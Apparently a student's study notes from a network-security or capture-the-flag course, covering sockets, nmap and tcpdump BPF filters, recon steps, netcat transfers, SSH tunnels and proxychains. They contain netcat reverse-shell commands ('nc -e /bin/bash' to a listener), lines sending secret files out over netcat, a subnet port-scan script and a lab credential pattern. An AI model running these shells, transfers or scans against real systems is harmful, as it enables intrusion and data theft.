Socket Types
> Stream Sockets (TCP)    <- (User) Space Sockets
> Datagram Sockets (UDP)    <- (User) Space Sockets
> Raw Sockets (Configure)    <- (Kernel) Space Sockets
  > # Tells hardware to just send it out because we are going to be configuring it. Thats why it requires SUDO


User Space
> # NMAP no switches
> # TCPDUMP or wireshark to read a file
> # Using netcat to connect to a listener (Dont use SUDO to banner grab)
> # Using netcat to create a listener above the well known port range (1024+)
Kernel Space
> # Capturing packets on the wire
> # OS Identification or to set specific flags when scanning
> # Using scapy to craft or modify a packet for transmission
> # Using python to craft or modify RAW sockets for transmission
> # Network devices using routing protocols such as OSPF
> # Any traffic without Transport Header (ICMP)


Python
> import {module}
> from {module} import *
  > # allows to call functions from module like the function was literally inside your code so instead of example.funct() it would just be funct()
> socket.socket [ SYNTAX: socket.socket( <family>, <type>, <proto> ) ] (import socket)
> Family
  > # AF_INET*
  > # AF_INET6
  > # AF_UNIX
    > # What daemons use to speak to hardware
> Type
  > # SOCK_STREAM* (TCP)
  > # SOCK_DGRAM (UDP)
> Proto
  > 0*
  > # IPPROTO_TCP
  > # IPPROTO_UDP
  > # IPPROTO_IP
  > # IPPROTO_ICMP
  > # IPPROTO_RAW
> Functions
  > # connect() [CLIENT-SIDE CONNECTION]
  > # close() [CLOSES TCP CONNECTION (Client/Server)]
  > # sendto()
    > # this sends data to a socket while not already being connected to a remote socket



Socket Functions
> Client
  > socket(family, type, proto)
  > Connect((ip, port))
    > # TCP Only
  > send()
    > # Send to established Socket
  > sendto()
    > # Send to UNenstablished socket
  > sendall()
    > # Repeats 'send' until all data sent
  > recv()
    > # Receive data from socket
  > recvfrom()
    > # Recieve data and socket info
  > close()
    > # Close a socket file descriptor
> Server
  > socket
  > setsockpot(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
  > bind((",port))
  > listen(1)
    > # Enable a server to accept TCP connections
  > accept()
    > # TCP only
  > recv()
    > # Receive data from socket
  > recvfrom()
    > # Recieve data and socket info
  > send()
    > # Send to established Socket
  > sendto()
    > # Send to UNenstablished socket
  > sendall()
    > # Repeats 'send' until all data sent
  > close()
    > # Close a socket file descriptor




[SOCKET SCRIPTS Stream, Dgram, Ipraw, Tcpraw]
Stream (What to change)
  > # Message (Optional)
Dgram
  > # Message (Optional)
IPRaw
  > # dst_ip
  > # ip_ver_ihl
  > # ip_tos
  > # ip_id
  > # ip_frag = 0
  > # ip_ttl
  > # ip_proto
  > # Message (Optional)
TCPRaw
  > # dst_ip
  > # dst_ip
  > # ip_ver_ihl
  > # ip_tos
  > # ip_id
  > # ip_frag = 0
  > # ip_ttl
  > # ip_proto
  > # tcp_src
  > # tcp_dst
  > # tcp_ack_seq
  > # tcp_data_off
  > # tcp_reserve
  > # tcp_flags (Optional if you want to just set a hex value instead of individual flags
  > # tcp_win
  > # tcp_chk = 0
  > # tcp_urg_ptr = 0
  > # Message (Optional)



Encoding 
> Text to Hex
  /> echo "Message" | xxd
> File to Hex
  /> xxd file.txt file-encoded.txt
> Decode file from Hex
  /> xxd -r file-encoded.txt file-decoded.txt
> Python Hex Ecoding
  # import binascii
  # message = b'Message'
  # hidden_msg = binascii.hexlify(message)

====================================== METHODOLOGIES ============================================

Net Recon Methodology
> Host Discovery
#############NMAP SCANS##############
nmap -sP <ip address/cidr>
  ping sweep options
-Pn (no ping)
-PE (ICMP ping)
nmap -Pn [IP Addr] -T4 -p 21-23,80 (elite single ip scan)
-T4 aggressive scan, doesn't drop packets but is fast
-sS (syn scan) 
-sT (full connect scan)
-sN (null scan)
-sF (fin scan)
-sU (UDP scan)
-sI (idle scan)
-sA (ack/window scan)
-sR (RPC scan)

tcpdump 'tcp[0:2]=23'
  tcp traffic whose source port is 23
tcpdump 'tcp[2:2]=23'
  tcp traffic whose destination port is 23
  > # Ruby ping sweep (if ping sweep available)
  > # NMAP scan if no ping
> Port Discovery
  > # NMAP
  > # nc scan script
> Port Validation
  > # Banner grabbing using nc
> Follow-on actions based on ports found
  > # if 21 FTP [IP ADDR] connects to ftp server
    /> passive
    /> ls
    /> get [filename]
  > # if 21 or 80 wget -r IP_ADDRESS (or) wget -r ftp://IP_ADDRESS (or) firefox
  > # if 22 or 23 CONNECT and PASSIVE RECON
> PASSIVE RECON

Scan Methodology
/> nmap -Pn [IP Addr] -T4 -p 21-23,80
  > # "-Pn" is no host discovery. Its telling nmap that we know its up. No pinging
  > # Quick Scan Ports 21-23, 80
  > # Specific ports based on hints/clues found
  > # Well know port range 1-1023
  > # which tcpdump wireshark nmap telnet get curl ping
  > # Chunks of 2000 or first 10000 ports (65535)

Passive Recon Methodology
/> hostname
  > # permissions:
    /> sudo -l
> Interfaces and subnets
  /> ip a
> Neighbors
  /> ip neigh
> Files of interest
  /> find / -iname flag* 2>/dev/null
  /> find / -name hint*
> Other listening ports
  /> ss -ntlp (TCP)
  /> ss -nulp (UDP)
> Available Tools
  /> which
  /> tcpdump
  /> wireshark
  /> nmap
  /> telnet
  /> get
  /> curl
  /> ping

TCPDUMP Options !!!!!!!!!!
> -A
  > # Prints frame payload in ASCII
> -D
  > # Print list of network interfaces available on the system
> -i
  > # Select a different interface
> -e
  > # Prints data-link headers
> -r 
  > # Reads from pcap
> -w
  > # Writes the capture to an output file
> -X
  > # Displays packet data in hex
> -XX
  > # Displays everything in hex (Including Layer 2)
> -vv
  > # Gives verbose output with detail on the TTL, IPID, ect.
> -n
  > # Does not convert protocol and addresses to names
  [EXAMPLE]
  /> tcpdump port 80 or 22 -vn
    > # TCPDUMP for specific protocol traffic
/> tcpdump <pcap> -XX -vv
  > # Magic command (Gives everything)
/> tcpdump <protocol>

TCPDump filtering with BPFâ€™s and bit-masking [SYNTAX] !!!!!!!!!!
----[ tcpdump {A} [B:C] {D} {E} {F} {G} ]----
> A = Protocol (ether | arp | ip | ip6 | icmp | tcp | udp)
> B = Header Byte number
> C = optional: Byte Length. Can be 1, 2 or 4 (default 1)
> D = optional: Bitwise mask (&)
> E = Operator (= | == | > | < | <= | >= | != | () | << | >>)
> F = Result of Expression
> G = optional: Logical Operator (&& ||) to bridge expressions
[EXAMPLE]
 /> tcpdump 'ether[12:2] = 0x0800 && (tcp[2:2] != 22 || tcp[2:2] != 23)'
 /> tcpdump -r BPFCheck.pcap 'ip[8] <= 64 || ip6[7] <= 64'

BPF [EXAMPLES]
/> tcp[0:2]=53||tcp[2:2]=53||udp[0:2]=53||udp[2:2]=53'
 > # this filters for any packet that uses dns protocol
/> ip[9]=0x11||ip6[6]=0x11
 > # this filters for packets that are using udp
/> ip[4:2]=213
 > # this filters for packets that have the ip ID of 213
/> tcp[0:2]>1024||udp[0:2]>1024'
 > # this filters for packets that have a source port greater than 1024
/> tcp[13]=0x10
 > # this filters for SYN-ACK in tcp
/> tcp[13]=0x04
 > # this filters for RST in tcp
/> tcp[2:2]<1024||udp[2:2]<1024
 > # this filters for well-known ports in tcp and udp
/> tcp[0:2]=80||tcp[2:2]=80
 > # this filters for all http traffic
/> ether[12:2]=0x0806
 > # this filters for arp
/> ip[6]&0x80=0x80
 > # this filters for the reserved bit "EVIL BIT"
/> tcp[13]&0x20=0&&tcp[18:2]!=0'
 > # this filters for the URG bit not being set and the URG pointer having a value
/> tcp[13]=0&&ip[16:4]=0x0a0a0a0a
 > # this filters for tcp null scan to the destination ip 10.10.10.10
/> ip[8]=1&&(ip[9]=0x01||ip[9]=0x11)'
 > # this filters for traceroute being used
/> ether[12:4]&0xffff0fff=0x81000001&&ether[16:4]&0xffff0fff=0x8100000a
 > # this filters for vlan hopping from vlan 1 to vlan 10 (looks through the vlan tags) [double-tagging]

dig axfr <site> <target site>
sudo p0f -i eth0
sudo p0f -r test.pcap


traceroute
nc (port scan)
-z port scanning mode
-vv verbose
-n do not resolve ip address
-w1 set timeout value to 1 
-u switch to udp

########################nc scan script#############################
#!/bin/bash
echo "Enter network address (e.g. 192.168.0): "
read net
echo "Enter starting host range (e.g. 1): "
read start
echo "Enter ending host range (e.g. 254): "
read end
echo "Enter ports space-delimited (e.g. 21-23 80): "
read ports
for ((i=$start; $i<=$end; i++))
do
    nc -nvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open'
done

banner grabbing (port validation)
nc <target ip> <target port>
-u to specify udp 

wget -r http://172.16.82.106
wget -r ftp://172.16.82.106

VyOS: 
show interface
show ip route
hostname

windows
arp -a (ip neighbors)
netstat
ipconfig
route print

linux
ip neighbor
ip address
ss - ports
ip route

if need a file but no telnet or ssh, but has ftp
ftp <ip address>
  login then can just use normal commands to get around
get <filename>
  will download file to home device


red internet host
Entry Float IP: 10.50.21.8

    Your Network Number is N (Given by Instructor)

    Credentials: net{N}_studentX:passwordX

    X is your student number

scp student@<ip address>:secret.txt /home/student
  copies from students home directory and brings to your local /home/student
scp secretstuff.txt student@<ip address>:/home/student
  uploads secretstuff.txt to student /home/student at <ip address>
scp -r folder/ student@<ip address>
  copies whatever is in the folder and sends it to student at <ip address>

scp uses capital P to specify a port to use
  scp -P

nc -lvp 9001 > newfile.txt
  listening (sends file)
nc 172.16.82.106 9001 < file.txt
  client (recieve file)

mkfifo mypipe 
nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
  relay

nc 172.16.82.106 1111 < secret.txt
  send

nc 192.168.1.1 333 > newsecret.txt
  receive


reverse shells
  nc -lvp 9999
    listen on your device

  nc -c /bin/bash 10.10.0.40 9999
    on victim using -c

  nc -e /bin/bash 10.10.0.40 9999
    on victim using -e

xxd -r <filename> <decoded filename>

###########################TUNNELS####################################
need loopback and port specified by tunnel

ssh student@<ip address> -L 1111:127.0.0.1:22 -NT
  creates local port forward to target device

scp -P 1111 student@127.0.0.1:secretstuff.txt /home/student
  goes through tunnel created above and copies secretstuff.txt and puts it in /home/student on local box
#########################################################################################################

ssh student@172.16.82.106 -D 9050 -NT
  creates a dynamic port forward to target device

proxychains tool allows interaction with dynamic tunnels
proxychains scp student@127.0.0.1:secretstuff.txt . 
  downloads file from a remote directory to a local directory

proxychains scp secretstuff.txt student@127.0.0.1
  uploads file to remote host through tunnel



